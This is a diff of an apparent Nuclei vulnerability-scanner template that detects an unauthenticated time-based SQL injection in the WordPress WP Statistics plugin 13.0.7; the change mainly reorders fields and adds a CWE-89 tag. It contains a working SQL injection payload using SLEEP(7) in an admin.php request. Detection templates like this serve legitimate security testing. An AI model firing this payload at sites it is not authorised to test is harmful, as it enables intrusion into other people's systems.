@@ -1,5 +1,4 @@
 id: wp-statistics-sqli
-
 info:
   name: WordPress WP Statistics Plugin 13.0.7 - SQL Injection
   author: r3Y3r53
@@ -12,38 +11,35 @@ info:
     - https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/
     - https://wordpress.org/plugins/wp-statistics/
   classification:
+    cwe-id:
+      - CWE-89
     cpe: cpe:2.3:a:veronalabs:wp_statistics:*:*:*:*:wordpress:*:*:*
   metadata:
-    verified: true
     max-request: 2
-    vendor: veronalabs
     product: wp_statistics
     publicwww-query: /wp-content/plugins/wp-statistics/
-  tags: time-based-sqli,sqli,unauth,exploitdb,wp-statistics,wp-plugin,wordpress,wp,vuln
+    vendor: veronalabs
+    verified: true
+  tags: exploitdb,sqli,time-based-sqli,unauth,vuln,wordpress,wp,wp-plugin,wp-statistics
 flow: http(1) && http(2)
-
 http:
-  - raw:
+  - matchers:
+      - internal: true
+        type: word
+        words:
+          - WP Statistics
+    raw:
       - |
         GET /wp-content/plugins/wp-statistics/readme.txt HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: word
-        words:
-          - 'WP Statistics'
-        internal: true
-
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - duration>=7
+          - status_code == 500
+        type: dsl
+    raw:
       - |
         @timeout: 20s
         GET /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(7))a) HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration>=7'
-          - 'status_code == 500'
-        condition: and
-
